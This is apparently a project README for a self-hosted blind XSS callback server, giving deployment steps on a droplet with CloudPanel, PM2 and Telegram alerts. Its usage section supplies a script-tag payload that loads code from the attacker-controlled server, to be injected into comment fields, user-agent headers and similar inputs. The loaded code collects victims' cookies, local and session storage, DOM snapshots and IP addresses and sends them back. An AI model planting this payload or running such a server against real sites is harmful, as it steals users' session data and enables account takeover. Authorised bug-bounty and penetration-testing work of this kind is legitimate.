# Blind XSS Server

A clean, secure blind XSS callback server. Node.js + Express + SQLite + Telegram alerts.

---

## Stack

- **Node.js** (Express) — backend
- **SQLite** (better-sqlite3) — hit storage
- **EJS** — dashboard templates
- **Telegram Bot** — real-time alerts
- **PM2** — process management
- **CloudPanel + Nginx** — reverse proxy + SSL

---

## Setup Guide

### 1. DigitalOcean Droplet

- Create a new Droplet: **Ubuntu 22.04 LTS**
- Size: **Basic / Regular / 1GB RAM ($6/mo)** — plenty
- Add your SSH key during creation
- Note the IP address

### 2. Install CloudPanel

SSH into your droplet, then run CloudPanel's official installer:

```bash
curl -sS https://installer.cloudpanel.io/ce/v2/install.sh -o install.sh
sudo bash install.sh
```

Follow the prompts. CloudPanel will install Nginx, PHP (ignore it), and its own panel.
Access it at `https://YOUR_IP:8443` — accept the self-signed cert warning.

### 3. Point your domain

In your DNS provider, create an A record:
```
xss.yourdomain.com  →  YOUR_DROPLET_IP
```
Wait for propagation (usually a few minutes with Cloudflare).

### 4. Create a Node.js site in CloudPanel

1. In CloudPanel → **Sites** → **Add Site**
2. Choose **Node.js**
3. Domain: `xss.yourdomain.com`
4. Node.js version: **20**
5. App port: **3000**
6. CloudPanel will auto-create an Nginx vhost with reverse proxy to port 3000
7. Then go to **SSL/TLS** → **Let's Encrypt** → issue free cert

### 5. Deploy the code

```bash
# SSH into your droplet
ssh root@YOUR_DROPLET_IP

# Navigate to the site directory CloudPanel created
cd /home/cloudpanel/htdocs/xss.yourdomain.com

# Clone your repo
git clone https://github.com/YOURUSERNAME/blind-xss.git .

# Install dependencies
npm install --production

# Set up your environment
cp .env.example .env
nano .env
```

Fill in `.env`:
```
DASHBOARD_PASSWORD=yourStrongPasswordHere
SESSION_SECRET=<run: node -e "console.log(require('crypto').randomBytes(64).toString('hex'))">
TELEGRAM_BOT_TOKEN=<from @BotFather>
TELEGRAM_CHAT_ID=<from @userinfobot>
SERVER_URL=https://xss.yourdomain.com
PORT=3000
```

### 6. Set up Telegram bot

1. Open Telegram → search **@BotFather**
2. Send `/newbot` → follow prompts → copy the **token**
3. Open **@userinfobot** → send `/start` → copy your **chat ID**
4. Paste both into `.env`

### 7. Start with PM2

```bash
# Install PM2 globally
npm install -g pm2

# Create logs dir
mkdir -p logs

# Start the app
pm2 start ecosystem.config.js

# Save process list (auto-restart on reboot)
pm2 save
pm2 startup
# Run the command PM2 prints out
```

### 8. Test it

```bash
# Check it's running
pm2 status

# Watch logs live
pm2 logs blind-xss
```

Visit `https://xss.yourdomain.com/dashboard` → login with your password.

---

## Usage

### Your payload (inject this anywhere)

```html
<script src="https://xss.yourdomain.com/payload.js"></script>
```

Or via `src` attribute injection, comment fields, user-agent, etc.

The payload collects:
- Page URL
- Cookies
- localStorage / sessionStorage
- DOM snapshot
- Referer
- IP + User Agent

### Dashboard

- `https://xss.yourdomain.com/dashboard` — view all hits
- Click any hit for full details
- Real-time Telegram alert fires on every hit

---

## Security Notes

- Dashboard is rate-limited (10 attempts / 15 min)
- Callback endpoint is rate-limited (60 req/min)
- Sessions are HTTP-only, secure, SameSite=strict
- Password is bcrypt hashed on first run
- Server only listens on 127.0.0.1 (Nginx proxies in)
- Helmet sets security headers
- DOM content is stored raw — **do not** render it as HTML in the dashboard (it doesn't, it uses `<pre>`)

---

## Updating

```bash
cd /home/cloudpanel/htdocs/xss.yourdomain.com
git pull
npm install --production
pm2 restart blind-xss
```
